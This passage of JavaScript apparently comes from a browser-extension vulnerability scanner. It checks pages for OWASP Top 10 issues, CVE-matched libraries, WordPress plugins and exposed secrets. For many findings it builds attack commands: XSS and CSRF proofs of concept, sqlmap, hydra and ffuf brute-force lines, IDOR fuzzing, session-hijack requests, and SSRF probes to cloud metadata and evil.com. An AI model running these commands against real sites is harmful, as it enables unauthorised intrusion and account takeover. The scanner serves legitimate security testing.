    const idorLinks = document.querySelectorAll('a[href*="/user/"], a[href*="/account/"], a[href*="/order/"], a[href*="/invoice/"]');
    const idorNumeric = [...idorLinks].filter(a => /\/\d{1,8}(\/|$|\?)/.test(a.getAttribute("href")));
    if (idorNumeric.length > 2) {
      const samplePath = idorNumeric[0].getAttribute("href").replace(/\d+/, "FUZZ");
      findings.push({ severity: "MEDIUM", title: `${idorNumeric.length} IDOR-prone URLs with sequential IDs`, detail: idorNumeric.slice(0, 3).map(a => a.getAttribute("href")).join("\n"), owasp: "A01",
        exploit: [
          { name: "ffuf", cmd: `ffuf -u "${targetUrl}${samplePath}" -w <(seq 1 1000) -mc 200 -t 20` },
          { name: "curl", cmd: `for i in $(seq 1 20); do echo "--- ID: $i ---"; curl -s "${targetUrl}${samplePath.replace("FUZZ", '"$i"')}" | head -5; done` },
        ] });
    }

    // ── A02: Cryptographic Failures ──

    const weakCrypto = inlineCode.match(/(?:CryptoJS\.(?:MD5|SHA1|DES|RC4)|crypto\.createHash\s*\(\s*['"](?:md5|sha1)['"])/gi);
    if (weakCrypto) {
      findings.push({ severity: "HIGH", title: `Weak cryptography (${weakCrypto.length}x)`, detail: [...new Set(weakCrypto)].join(", "), owasp: "A02" });
    }

    const bodyText = document.body ? document.body.innerText.substring(0, 200000) : "";
    const ccMatch = bodyText.match(/\b(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|3[47][0-9]{13})\b/g);
    if (ccMatch) {
      findings.push({ severity: "CRITICAL", title: `Credit card number(s) in page text`, detail: `Found ${ccMatch.length} pattern(s). Verify manually.`, owasp: "A02" });
    }

    // ── A03: Injection ──

    try {
      const params = new URLSearchParams(location.search);
      // Params that are commonly reflected but NOT XSS (IDs, slugs, pagination, etc.)
      const safeParamNames = /^(v|id|p|page|tab|lang|ref|src|utm_|fbclid|gclid|sort|order|limit|offset|q|s|search|query|category|tag|type|format|callback|_)$/i;
      params.forEach((value, key) => {
        if (safeParamNames.test(key)) return;
        // Skip short/alphanumeric-only values (IDs, hashes — not exploitable)
        if (/^[a-zA-Z0-9_-]+$/.test(value)) return;
        if (value.length <= 5) return;
        if (html.includes(value)) {
          findings.push({ severity: "HIGH", title: `Reflected XSS: param "${key}" in DOM`, detail: `Value "${value.substring(0, 40)}" found in page source.`, owasp: "A03",
            exploit: [
              { name: "curl (XSS test)", cmd: `curl -s "${targetUrl}${location.pathname}?${key}=<script>alert(1)</script>" | grep -i "alert"` },
              { name: "browser", cmd: `${location.origin}${location.pathname}?${key}="><img src=x onerror=alert(document.domain)>` },
            ],
            burp: `GET ${location.pathname}?${key}=%22%3E%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1\r\nHost: ${host}\r\nAccept: text/html\r\n\r\n`
          });
        }
      });
    } catch (_) {}

    // javascript: hrefs — only flag those with dynamic/suspicious content
    const jsHrefs = [...document.querySelectorAll('a[href^="javascript:"]')];
    // Filter out static patterns like javascript:void(0), javascript:;, submit(), etc.
    const suspiciousJs = jsHrefs.filter(a => {
      const href = a.getAttribute("href").toLowerCase();
      return !(/^javascript:\s*;?\s*$/.test(href) ||
               /^javascript:\s*void\s*\(/.test(href) ||
               /^javascript:\s*document\.querySelector\(/.test(href) ||
               /^javascript:\s*return\s+(false|true)/.test(href) ||
               /^javascript:\s*history\./.test(href) ||
               /^javascript:\s*window\.(print|close|back)\(/.test(href));
    });
    if (suspiciousJs.length > 0) {
      findings.push({ severity: "HIGH", title: `${suspiciousJs.length} suspicious javascript: href(s)`, detail: suspiciousJs.slice(0, 3).map(a => a.getAttribute("href").substring(0, 80)).join("\n"), owasp: "A03",
        exploit: [{ name: "browser console", cmd: suspiciousJs.slice(0, 1).map(a => a.getAttribute("href").substring(0, 100)).join("") }] });
    } else if (jsHrefs.length > 0) {
      findings.push({ severity: "LOW", title: `${jsHrefs.length} javascript: href(s) (static/benign)`, detail: "Static javascript: links found — not exploitable but indicates outdated patterns.", owasp: "A03" });
    }

    const sourceToSink = inlineCode.match(/(?:location\.(hash|search|href)|document\.(URL|referrer|cookie))[\s\S]{0,80}(?:innerHTML|outerHTML|document\.write|eval|\.html\()/gm);
    if (sourceToSink) {
      findings.push({ severity: "HIGH", title: `DOM XSS source-to-sink flow (${sourceToSink.length}x)`, detail: sourceToSink.slice(0, 2).map(s => s.substring(0, 100)).join("\n"), owasp: "A03",
        exploit: [
          { name: "browser", cmd: `${location.origin}${location.pathname}#<img src=x onerror=alert(document.domain)>` },
          { name: "browser", cmd: `${location.origin}${location.pathname}?q="><img src=x onerror=alert(1)>` },
        ] });
    }

    if (/['"`]\s*(?:SELECT|INSERT|UPDATE|DELETE|DROP)\s+/i.test(inlineCode)) {
      findings.push({ severity: "MEDIUM", title: "SQL syntax in client-side code", detail: "SQL queries built in JS — server may be vulnerable.", owasp: "A03",
        exploit: [{ name: "sqlmap", cmd: `sqlmap -u "${targetUrl}/" --forms --batch --level 3 --risk 2` }] });
    }

    // ── A04: Insecure Design ──

    document.querySelectorAll('form[method="post" i]').forEach(form => {
      const hasCsrf = form.querySelector('input[name*="csrf"], input[name*="token"], input[name*="_token"], input[name*="nonce"], input[name*="authenticity_token"], input[name*="antiforgery"]');
      // Skip search/filter forms — they're not state-changing
      const isSearch = form.querySelector('input[type="search"], input[name*="search"], input[name*="query"], input[name="q"], input[name="s"]');
      const isFilter = form.querySelector('select') && !form.querySelector('input[type="password"]') && form.querySelectorAll("input").length <= 2;
      if (!hasCsrf && !isSearch && !isFilter && form.querySelectorAll("input").length > 0) {
        const formAction = String(form.action || location.href);
        const inputs = [...form.querySelectorAll("input")].map(i => `${i.name || "?"}=${i.value || ""}`).join("&");
        findings.push({ severity: "MEDIUM", title: "POST form without CSRF token", detail: formAction, owasp: "A04",
          exploit: [
            { name: "CSRF PoC (HTML)", cmd: `<html><body onload="document.forms[0].submit()">\n<form method="POST" action="${formAction}">\n${[...form.querySelectorAll("input")].map(i => `  <input type="hidden" name="${i.name || ""}" value="${(i.value || "").substring(0, 50)}">`).join("\n")}\n</form>\n</body></html>` },
          ],
          burp: `POST ${new URL(formAction, location.origin).pathname} HTTP/1.1\r\nHost: ${host}\r\nContent-Type: application/x-www-form-urlencoded\r\nCookie: session=VICTIM_SESSION\r\n\r\n${inputs}`
        });
      }
    });

    const authForms = document.querySelectorAll('form[action*="login"], form[action*="signin"], form[action*="signup"], form[action*="register"]');
    const hasCaptcha = !!document.querySelector('.g-recaptcha, .h-captcha, .cf-turnstile, [data-sitekey], iframe[src*="recaptcha"], iframe[src*="hcaptcha"]');
    if (authForms.length > 0 && !hasCaptcha) {
      const loginAction = authForms[0].action || location.href;
      findings.push({ severity: "LOW", title: "Auth form without CAPTCHA", detail: "May allow brute-force.", owasp: "A04",
        exploit: [
          { name: "hydra", cmd: `hydra -L users.txt -P passwords.txt ${host} http-post-form "${new URL(loginAction, location.origin).pathname}:username=^USER^&password=^PASS^:Invalid"` },
          { name: "ffuf", cmd: `ffuf -u "${loginAction}" -X POST -d "username=admin&password=FUZZ" -w /usr/share/wordlists/rockyou.txt -mc 302 -t 40` },
        ] });
    }

    const dangerLinks = document.querySelectorAll('a[href*="delete"], a[href*="remove"], a[href*="transfer"], a[href*="approve"]');
    if (dangerLinks.length > 0) {
      findings.push({ severity: "MEDIUM", title: `${dangerLinks.length} state-changing action(s) via GET`, detail: [...dangerLinks].slice(0, 3).map(a => a.getAttribute("href")).join("\n"), owasp: "A04",
        exploit: [{ name: "CSRF PoC", cmd: `<img src="${[...dangerLinks][0].href}" style="display:none">` }] });
    }

    // ── A05: Security Misconfiguration ──

    if (/(?:DEBUG\s*[:=]\s*(?:True|true|1)|APP_DEBUG\s*=\s*true|DJANGO_DEBUG)/g.test(inlineCode)) {
      findings.push({ severity: "HIGH", title: "Debug mode enabled", detail: "Debug flag found in inline scripts.", owasp: "A05",
        exploit: [{ name: "curl", cmd: `curl -s "${targetUrl}/" -H "X-Debug: 1" -D- | head -40` }] });
    }

    const docTitle = document.title || "";
    if (/^Index of\s+\//i.test(docTitle)) {
      findings.push({ severity: "HIGH", title: "Directory listing enabled", detail: `Page title: "${docTitle}"`, owasp: "A05",
        exploit: [
          { name: "curl", cmd: `curl -s "${targetUrl}/" | grep -oP 'href="[^"]*"' | sort -u` },
          { name: "wget", cmd: `wget -r -np -nH "${targetUrl}/" -P ./loot/` },
        ] });
    }

    const defaultCreds = html.match(/<!--[\s\S]*?(?:password|credential|default.*?login|admin\s*:\s*admin)[\s\S]*?-->/gi);
    if (defaultCreds) {
      findings.push({ severity: "HIGH", title: "Credentials in HTML comments", detail: defaultCreds[0].substring(0, 100), owasp: "A05" });
    }

    // ── A07: Auth Failures ──

    const sessionInUrl = location.href.match(/(PHPSESSID|JSESSIONID|session_?id|sid|token|auth)=[a-zA-Z0-9_-]{8,}/i);
    if (sessionInUrl) {
      findings.push({ severity: "HIGH", title: "Session token in URL", detail: sessionInUrl[0], owasp: "A07",
        exploit: [{ name: "session hijack", cmd: `curl -s "${targetUrl}/profile" -b "${sessionInUrl[0]}" | head -30` }] });
    }

    const textPasswords = document.querySelectorAll('input[type="text"][name*="pass"], input[type="text"][name*="pwd"]');
    if (textPasswords.length > 0) {
      findings.push({ severity: "HIGH", title: `${textPasswords.length} password field(s) as type="text"`, detail: "Password visible in cleartext.", owasp: "A07" });
    }

    if (/(user not found|email not registered|no account|username does not exist)/i.test(bodyText)) {
      findings.push({ severity: "MEDIUM", title: "Username enumeration via error message", detail: "Different error reveals valid usernames.", owasp: "A07",
        exploit: [{ name: "ffuf", cmd: `ffuf -u "${targetUrl}/login" -X POST -d "username=FUZZ&password=invalid" -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt -mr "incorrect password" -t 10` }] });
    }

    // ── A08: Integrity Failures ──

    if (/addEventListener\s*\(\s*['"]message['"]/.test(inlineCode) && !/event\.origin|e\.origin|msg\.origin/.test(inlineCode)) {
      findings.push({ severity: "HIGH", title: "postMessage without origin check", detail: "Accepts messages from any origin.", owasp: "A08",
        exploit: [{ name: "PoC (HTML)", cmd: `<html><body>\n<script>\n  const w = window.open('${targetUrl}');\n  setTimeout(() => {\n    w.postMessage('{"action":"xss","data":"<img src=x onerror=alert(1)>"}', '*');\n  }, 2000);\n</script>\n</body></html>` }] });
    }

    const dynScripts = inlineCode.match(/createElement\s*\(\s*['"]script['"]\)[\s\S]{0,100}\.src\s*=/g);
    if (dynScripts) {
      findings.push({ severity: "MEDIUM", title: `Dynamic script injection (${dynScripts.length}x)`, detail: "Scripts created at runtime — verify integrity.", owasp: "A08" });
    }

    // ── A09: Logging & Monitoring ──

    if (/window\.onerror\s*=\s*function[^}]*return\s+true/m.test(inlineCode)) {
      findings.push({ severity: "MEDIUM", title: "Global error suppression", detail: "window.onerror returns true — errors swallowed.", owasp: "A09" });
    }

    const sensitiveLog = inlineCode.match(/console\.(?:log|debug)\s*\([^)]*(?:password|token|secret|key|session|auth)[^)]*\)/gi);
    if (sensitiveLog) {
      findings.push({ severity: "MEDIUM", title: `Sensitive data in console.log (${sensitiveLog.length}x)`, detail: sensitiveLog.slice(0, 2).join("\n"), owasp: "A09" });
    }

    // ── A10: SSRF Indicators ──

    const ssrfInputs = document.querySelectorAll('input[type="url"], input[name*="url" i], input[name*="webhook" i], input[name*="callback" i], input[placeholder*="http"]');
    if (ssrfInputs.length > 0) {
      const ssrfForm = ssrfInputs[0].closest("form");
      const ssrfAction = ssrfForm ? ssrfForm.action : targetUrl;
      const ssrfName = ssrfInputs[0].name || "url";
      findings.push({ severity: "MEDIUM", title: `${ssrfInputs.length} URL input(s) — potential SSRF`, detail: [...ssrfInputs].slice(0, 3).map(i => `name="${i.name}"`).join(", "), owasp: "A10",
        exploit: [
          { name: "curl (AWS metadata)", cmd: `curl -s -X POST "${ssrfAction}" -d "${ssrfName}=http://169.254.169.254/latest/meta-data/"` },
          { name: "curl (internal)", cmd: `curl -s -X POST "${ssrfAction}" -d "${ssrfName}=http://127.0.0.1:8080/"` },
          { name: "curl (DNS)", cmd: `curl -s -X POST "${ssrfAction}" -d "${ssrfName}=http://YOURBURPCOLLABORATOR.oastify.com/"` },
        ],
        burp: `POST ${new URL(ssrfAction, location.origin).pathname} HTTP/1.1\r\nHost: ${host}\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n${ssrfName}=http://169.254.169.254/latest/meta-data/`
      });
    }

    try {
      const urlParams = new URLSearchParams(location.search);
      const ssrfParamNames = ["url", "link", "src", "dest", "redirect", "return_url", "next", "target", "uri", "callback", "proxy", "fetch"];
      urlParams.forEach((value, key) => {
        if (ssrfParamNames.includes(key.toLowerCase()) && /^https?:\/\//.test(value)) {
          findings.push({ severity: "HIGH", title: `URL param "${key}" — SSRF/open redirect`, detail: `${key}=${value.substring(0, 60)}`, owasp: "A10",
            exploit: [
              { name: "curl (SSRF)", cmd: `curl -s -D- "${targetUrl}${location.pathname}?${key}=http://169.254.169.254/latest/meta-data/"` },
              { name: "curl (redirect)", cmd: `curl -s -D- "${targetUrl}${location.pathname}?${key}=https://evil.com/"` },
            ],
            burp: `GET ${location.pathname}?${key}=http://169.254.169.254/latest/meta-data/ HTTP/1.1\r\nHost: ${host}\r\nAccept: */*\r\n\r\n`
          });
        }
      });
    } catch (_) {}

    return findings;
  }

  /* ================================================================== */
  /*  11. Exploit Command Resolution                                    */
  /* ================================================================== */

  function resolveExploitsForFindings(cveFindings, wpCVEs, targetUrl) {
    const exploits = [];
    const allCVEs = [...cveFindings, ...wpCVEs];

    for (const finding of allCVEs) {
      if (!finding.cve) continue;
      const resolved = resolveExploitCommands(finding.cve, targetUrl);
      if (resolved) {
        exploits.push({
          cve: finding.cve,
          lib: finding.lib,
          severity: finding.severity,
          title: finding.title,
          confidence: finding.confidence,
          ...resolved
        });
      }
    }
    return exploits;
  }

  /* ================================================================== */
  /*  11. WordPress Scanner                                             */
  /* ==================================================================*/

  function scanWordPress() {
    const result = { isWP: false, coreVersion: null, plugins: [], themes: [], cve: [], signals: [] };
    const html = document.documentElement.innerHTML;

    // Core detection — meta generator
    const gen = document.querySelector('meta[name="generator"]');
    if (gen && /wordpress/i.test(gen.content)) {
      result.isWP = true;
      const vm = gen.content.match(/WordPress\s+([\d.]+)/i);
      if (vm) result.coreVersion = vm[1];
      result.signals.push("meta generator: " + gen.content);
    }

    // Fallback core detection
    if (!result.isWP) {
      const wpIndicators = [
        /\/wp-content\//,
        /\/wp-includes\//,
        /\/wp-json\//,
        /wp-emoji-release\.min\.js/,
      ];
      for (const re of wpIndicators) {
        if (re.test(html)) { result.isWP = true; result.signals.push("pattern: " + re.source); break; }
      }
    }

    if (!result.isWP) return result;

    // Collect all resource URLs (scripts + stylesheets + links)
    const resourceUrls = [];
    document.querySelectorAll("script[src], link[href]").forEach(el => {
      resourceUrls.push(el.src || el.href || "");
    });
    // Also scan inline script content for plugin/theme paths
    const inlineRefs = html.match(/\/wp-content\/(?:plugins|themes)\/[^"'\s)]+/g) || [];
    resourceUrls.push(...inlineRefs);

    // Extract plugins
    const pluginMap = new Map();
    const pluginRe = /\/wp-content\/plugins\/([^/]+)\//g;
    for (const url of resourceUrls) {
      let m;
      const re = new RegExp(pluginRe.source, "g");
      while ((m = re.exec(url)) !== null) {
        const slug = m[1];
        if (pluginMap.has(slug)) continue;

        // Try to extract version from ?ver= parameter
        let version = null;
        const verMatch = url.match(/[?&]ver=([\d.]+)/);
        if (verMatch) version = verMatch[1];

        pluginMap.set(slug, { slug, version, src: url.substring(0, 120) });
      }
    }
    result.plugins = [...pluginMap.values()];

    // Extract themes
    const themeMap = new Map();
    const themeRe = /\/wp-content\/themes\/([^/]+)\//g;
    for (const url of resourceUrls) {
      let m;
      const re = new RegExp(themeRe.source, "g");
      while ((m = re.exec(url)) !== null) {
        const slug = m[1];
        if (themeMap.has(slug)) continue;
        let version = null;
        const verMatch = url.match(/[?&]ver=([\d.]+)/);
        if (verMatch) version = verMatch[1];
        themeMap.set(slug, { slug, version });
      }
    }
    result.themes = [...themeMap.values()];

    // Additional version extraction from wp-emoji / wp-includes scripts
    if (!result.coreVersion) {
      for (const url of resourceUrls) {
        if (/wp-emoji-release\.min\.js/.test(url) || /wp-includes/.test(url)) {
          const vm = url.match(/[?&]ver=([\d.]+)/);
          if (vm) { result.coreVersion = vm[1]; break; }
        }
      }
    }

    // WP-JSON exposure check
    if (/\/wp-json\//.test(html) || document.querySelector('link[rel="https://api.w.org/"]')) {
      result.signals.push("WP REST API exposed (wp-json)");
    }

    // XML-RPC indicator
    if (document.querySelector('link[rel="pingback"]')) {
      result.signals.push("XML-RPC likely enabled (pingback link)");
    }

    // CVE matching — core
    if (result.coreVersion && isValidVersion(result.coreVersion)) {
      const coreEntries = GODSEYE_WP_CVE_DB["__core__"] || [];
      for (const entry of coreEntries) {
        if (!isBelow(result.coreVersion, entry.fixed)) continue;
        if (entry.from && isBelow(result.coreVersion, entry.from)) continue;
        result.cve.push({ ...entry, lib: "WordPress Core", version: result.coreVersion, confidence: "confirmed" });
      }
    }

    // CVE matching — plugins
    for (const plugin of result.plugins) {
      const entries = GODSEYE_WP_CVE_DB[plugin.slug];
      if (!entries || !entries.length) continue;
      for (const entry of entries) {
        if (plugin.version && isValidVersion(plugin.version)) {
          if (!isBelow(plugin.version, entry.fixed)) continue;
          if (entry.from && isBelow(plugin.version, entry.from)) continue;
          result.cve.push({ ...entry, lib: plugin.slug, version: plugin.version, confidence: "confirmed" });
        } else if (!plugin.version) {
          result.cve.push({ ...entry, lib: plugin.slug, version: "unknown", confidence: "unverified", title: entry.title + " (version not confirmed)" });
        }
      }
    }

    // Sort by severity
    result.cve.sort((a, b) => (GODSEYE_SEVERITY_WEIGHT[b.severity] || 0) - (GODSEYE_SEVERITY_WEIGHT[a.severity] || 0));

    return result;
  }

  /* ================================================================== */
  /*  Library Merge — combine all detection sources, best version wins  */
  /* ================================================================== */

  function mergeLibraries(mainWorld, dom, banners, urls, sourceMaps, css) {
    const merged = new Map();

    function add(lib, info) {
      const existing = merged.get(lib);
      if (!existing) { merged.set(lib, info); return; }
      // Prefer confirmed version over "detected"
      if (existing.v === "detected" && info.v !== "detected") merged.set(lib, info);
      // Prefer more specific version
      if (existing.v && info.v && isValidVersion(info.v) && !isValidVersion(existing.v)) merged.set(lib, info);
    }

    // Priority order: main world > banners > URLs > source maps > DOM > CSS
    for (const [lib, info] of Object.entries(mainWorld)) {
      if (lib.startsWith("__")) continue; // internal signals
      add(lib, info);
    }
    for (const [lib, info] of banners) add(lib, info);
    for (const [lib, info] of urls) add(lib, info);
    for (const [lib, info] of sourceMaps) add(lib, info);
    for (const [lib, info] of dom) {
      if (lib.startsWith("__")) continue;
      add(lib, info);
    }
    for (const [lib, info] of css) add(lib, info);

    return merged;
  }

  /* ================================================================== */
  /*  CVE Matching — ONLY on confirmed versions                         */
  /* ================================================================== */

  function matchCVEs(libraries) {
    const findings = [];
    for (const [lib, info] of libraries) {
      const version = info.v;
      const entries = GODSEYE_CVE_DB[lib];
      if (!entries) continue;

      for (const entry of entries) {
        if (!isValidVersion(version)) continue;
        if (!isBelow(version, entry.fixed)) continue;
        if (entry.from && isBelow(version, entry.from)) continue;
        findings.push({ ...entry, lib, version, confidence: "confirmed", method: info.m });
      }
    }
    findings.sort((a, b) => (GODSEYE_SEVERITY_WEIGHT[b.severity] || 0) - (GODSEYE_SEVERITY_WEIGHT[a.severity] || 0));
    return findings;
  }

  /* ================================================================== */
  /*  Security Scanners (unchanged from v1 — proven reliable)           */
  /* ================================================================== */

  function auditHeaders() {
    const findings = [];

    // CSP — only flag if no meta tag AND no evidence of header-based CSP
    // Sites with strict CSP via header will block our inline injection, which is a sign CSP exists
    const cspMeta = document.querySelector('meta[http-equiv="Content-Security-Policy"]');
    if (cspMeta) {
      const csp = cspMeta.content || "";
      if (csp.includes("'unsafe-inline'"))
        findings.push({ severity: "MEDIUM", title: "CSP allows unsafe-inline", detail: `Weakens XSS protection. Value: ${csp.substring(0, 120)}` });
      if (csp.includes("'unsafe-eval'"))
        findings.push({ severity: "MEDIUM", title: "CSP allows unsafe-eval", detail: `Enables eval-based attacks. Value: ${csp.substring(0, 120)}` });
      if (csp.includes("*") && !csp.includes("*.google"))
        findings.push({ severity: "MEDIUM", title: "CSP uses wildcard source", detail: "Allows loading resources from any origin." });
    }
    // Don't flag missing CSP meta — most sites use HTTP header CSP which we can't verify passively

    // Mixed content — only actual subresources, not <link rel="canonical"> or <a> tags
    if (location.protocol === "https:") {
      const insecure = document.querySelectorAll("script[src^='http:'], link[rel='stylesheet'][href^='http:'], img[src^='http:'], iframe[src^='http:']");
      if (insecure.length > 0)
        findings.push({ severity: "MEDIUM", title: `Mixed content: ${insecure.length} insecure resource(s)`, detail: [...insecure].slice(0, 5).map(e => e.tagName + ": " + (e.src || e.href)).join("\n") });
    }

    // SRI — skip same-org CDNs (google, facebook, microsoft, etc.)
    const trustedCDNs = /\.(google|gstatic|googleapis|googlesyndication|doubleclick|facebook|fbcdn|microsoft|msecnd|cloudflare|cloudfront|akamai)\./i;
    const extNoSRI = [];
    document.querySelectorAll("script[src]").forEach(el => {
      if (!el.src || el.src.startsWith(location.origin) || el.integrity) return;
      if (trustedCDNs.test(el.src)) return; // same trust domain
      extNoSRI.push(el.src);
    });
    if (extNoSRI.length > 0)
      findings.push({ severity: "MEDIUM", title: `${extNoSRI.length} external script(s) without SRI`, detail: extNoSRI.slice(0, 5).join("\n"), owasp: "A08",
        exploit: [{ name: "verify integrity", cmd: `# Generate SRI hash for each script:\n${extNoSRI.slice(0, 3).map(u => `curl -s "${u}" | openssl dgst -sha384 -binary | openssl base64 -A && echo`).join("\n")}` }] });

    const iframes = document.querySelectorAll("iframe[src]");
    if (iframes.length > 5)
      findings.push({ severity: "LOW", title: `${iframes.length} iframes detected`, detail: "High number of iframes may indicate clickjacking risk." });

    return findings;
  }

  function auditCookies() {
    const findings = [];
    const raw = document.cookie;
    if (!raw) return findings;

    // Skip cookie audit on major platforms — their auth cookies are first-party by design
    const majorPlatforms = /\.(google|youtube|facebook|instagram|twitter|x|microsoft|apple|amazon|github|linkedin|netflix)\./i;
    if (majorPlatforms.test(location.hostname)) return findings;

    const cookies = raw.split(";").map(c => c.trim().split("=")[0]).filter(Boolean);
    // Filter out well-known non-sensitive cookies
    const ignoreCookies = /^(PREF|NID|_ga|_gid|_gat|_fbp|_gcl|consent|cookie_consent|lang|locale|theme|timezone|__utm)/i;
    const filtered = cookies.filter(n => !ignoreCookies.test(n));
    const sensitive = filtered.filter(n => /sess|token|auth|jwt|csrf|sid|login|key|api/i.test(n));
    if (sensitive.length > 0)
      findings.push({ severity: "HIGH", title: `${sensitive.length} sensitive cookie(s) without HttpOnly`, detail: sensitive.join(", ") });
    const other = filtered.filter(n => !sensitive.includes(n));
    if (other.length > 3) // Only flag if many — a few is normal
      findings.push({ severity: "LOW", title: `${other.length} cookie(s) without HttpOnly`, detail: other.slice(0, 5).join(", ") });

    return findings;
  }

  function scanSecrets() {
    const findings = [];
    const text = document.documentElement.innerHTML.substring(0, 500000);

    const patterns = [
      { name: "AWS Access Key",     re: /AKIA[0-9A-Z]{16}/g,                                                        sev: "CRITICAL" },
      { name: "AWS Secret Key",     re: /(?:aws_secret_access_key|secret_key)\s*[:=]\s*["']?([A-Za-z0-9/+=]{40})/gi, sev: "CRITICAL" },
      { name: "Google API Key",     re: /AIza[0-9A-Za-z_-]{35}/g,                                                   sev: "LOW" },
      { name: "Google OAuth Client", re: /[0-9]+-[a-z0-9_]{32}\.apps\.googleusercontent\.com/g,                      sev: "LOW" },
      { name: "Firebase Config",    re: /firebaseConfig\s*[:=]\s*\{[^}]{10,300}\}/g,                                 sev: "HIGH" },
      { name: "GitHub Token",       re: /gh[ps]_[A-Za-z0-9_]{36,}/g,                                                sev: "CRITICAL" },
      { name: "Slack Token",        re: /xox[bpors]-[0-9]{10,}-[0-9A-Za-z-]+/g,                                     sev: "HIGH" },
      { name: "Stripe Secret",     re: /sk_live_[0-9a-zA-Z]{24,}/g,                                                sev: "CRITICAL" },
      { name: "Stripe Publishable", re: /pk_live_[0-9a-zA-Z]{24,}/g,                                                sev: "LOW" },
      { name: "Private Key",        re: /-----BEGIN\s+(RSA\s+)?PRIVATE\s+KEY-----/g,                                 sev: "CRITICAL" },
      { name: "JWT Token",          re: /eyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]+/g,           sev: "MEDIUM" },
      { name: "Generic API Key",    re: /(?:api[_-]?key|apikey|api_secret)\s*[:=]\s*["']([A-Za-z0-9_-]{16,})["']/gi, sev: "HIGH" },
      { name: "SendGrid Key",       re: /SG\.[A-Za-z0-9_-]{22}\.[A-Za-z0-9_-]{43}/g,                                sev: "CRITICAL" },
      { name: "Database URL",       re: /(?:mongodb|postgres|mysql|redis):\/\/[^\s"'<]{10,}/gi,                      sev: "CRITICAL" },
    ];

    for (const p of patterns) {
      const matches = text.match(p.re);
      if (matches) {
        const unique = [...new Set(matches)];
        findings.push({
          severity: p.sev,
          title: `${p.name} exposed (${unique.length})`,
          detail: unique.slice(0, 3).map(m => m.substring(0, 80) + (m.length > 80 ? "..." : "")).join("\n")
        });
      }
    }
    return findings;
  }

  function scanDOMSinks() {
    const findings = [];
    let code = "";
    document.querySelectorAll("script:not([src])").forEach(s => { code += s.textContent + "\n"; });
    code = code.substring(0, 300000);

    const sinks = [
      { name: "eval()",                 re: /[^a-zA-Z_]eval\s*\(/g,             sev: "HIGH" },
      { name: "Function() constructor", re: /new\s+Function\s*\(/g,             sev: "HIGH" },
      { name: "document.write()",       re: /document\.write\s*\(/g,            sev: "MEDIUM" },
      { name: "innerHTML assignment",   re: /\.innerHTML\s*=/g,                 sev: "MEDIUM" },
      { name: "outerHTML assignment",   re: /\.outerHTML\s*=/g,                 sev: "MEDIUM" },
      { name: "insertAdjacentHTML()",   re: /\.insertAdjacentHTML\s*\(/g,       sev: "MEDIUM" },
      { name: "setTimeout(string)",     re: /setTimeout\s*\(\s*["'`]/g,        sev: "MEDIUM" },
      { name: "setInterval(string)",    re: /setInterval\s*\(\s*["'`]/g,       sev: "MEDIUM" },
    ];

    for (const s of sinks) {
      const m = code.match(s.re);
      if (m && m.length > 0)
        findings.push({ severity: s.sev, title: `DOM XSS sink: ${s.name} (${m.length}x)`, detail: `${m.length} instance(s) in inline scripts.`, owasp: "A03",
          exploit: [{ name: "browser console", cmd: `// Search for this sink in DevTools Sources tab:\n// Ctrl+Shift+F → search for "${s.name.replace(/[()]/g, "")}"\n// Check if user input (URL params, postMessage, etc.) reaches this sink` }] });
    }
    return findings;
  }

  function scanInfoDisclosure() {
    const findings = [];
    const html = document.documentElement.innerHTML.substring(0, 200000);

    const comments = html.match(/<!--[\s\S]*?-->/g) || [];
    const sensitive = comments.filter(c => /todo|fixme|hack|password|secret|token|api.?key|bug|debug|admin/i.test(c));
    if (sensitive.length > 0)
      findings.push({ severity: "LOW", title: `${sensitive.length} HTML comment(s) with sensitive keywords`, detail: sensitive.slice(0, 3).map(c => c.substring(0, 100)).join("\n") });

    const mapRefs = html.match(/\/\/[#@]\s*sourceMappingURL=\S+/g) || [];
    if (mapRefs.length > 0)
      findings.push({ severity: "LOW", title: `Source maps exposed (${mapRefs.length})`, detail: mapRefs.slice(0, 3).join("\n") });

    if (/(?:at\s+\w+\s+\(.*:\d+:\d+\)|Traceback\s+\(most\s+recent|Exception\s+in\s+thread)/i.test(html))
      findings.push({ severity: "MEDIUM", title: "Stack trace / debug output detected", detail: "Indicates debug mode or unhandled errors in production." });

    const gen = document.querySelector('meta[name="generator"]');
    if (gen)
      findings.push({ severity: "LOW", title: `Technology disclosed: ${gen.content}`, detail: "Generator meta tag reveals backend technology." });

    return findings;
  }

  function auditForms() {
    const findings = [];
    let insecureAction = 0, pwNoHTTPS = 0;

    document.querySelectorAll("form").forEach(form => {
      if (String(form.action || "").startsWith("http:") && location.protocol === "https:") insecureAction++;
      if (form.querySelectorAll('input[type="password"]').length > 0 && location.protocol !== "https:") pwNoHTTPS++;
    });

    if (insecureAction > 0)
      findings.push({ severity: "HIGH", title: `${insecureAction} form(s) submit over HTTP`, detail: "Credentials may be sent unencrypted." });
    if (pwNoHTTPS > 0)
      findings.push({ severity: "CRITICAL", title: `${pwNoHTTPS} password field(s) on non-HTTPS page`, detail: "Credentials transmitted in plaintext." });

    return findings;
  }

  /* ================================================================== */
  /*  Orchestrator — run everything and assemble results                */
  /* ================================================================== */

  async function runFullScan() {
    // Phase 1: parallel — main world + DOM-only
    const [mainWorldData, domData] = await Promise.all([
      probeMainWorld(),
      Promise.resolve(detectFromDOM()),
    ]);

    // Phase 2: synchronous scans
    const banners = parseBanners();
    const urls = matchScriptURLs();
    const sourceMaps = decodeInlineSourceMaps();
    const css = detectCSSFrameworks();

    // Phase 3: merge libraries
    const libraries = mergeLibraries(mainWorldData, domData, banners, urls, sourceMaps, css);

    // Phase 4: deep analysis
    const nextjs = detectNextJsDeep(mainWorldData, domData);
    const reactInference = inferReactVersion(mainWorldData);

    // Phase 5: CVE matching (confirmed versions only)
    const cveFindings = matchCVEs(libraries);

    // Phase 6: WordPress scan
    const wordpress = scanWordPress();

    // Phase 7: attack surface + exploit commands
    const attackSurface = mapAttackSurface();
    const exploits = resolveExploitsForFindings(cveFindings, wordpress.cve, location.origin);

    // Phase 8: OWASP Top 10
    const owasp = scanOWASP();

    // Phase 9: security scans
    const headers = auditHeaders();
    const cookies = auditCookies();
    const secrets = scanSecrets();
    const domSinks = scanDOMSinks();
    const infoDisc = scanInfoDisclosure();
    const forms = auditForms();

    // Build results
    const libsForUI = {};
    for (const [lib, info] of libraries) {
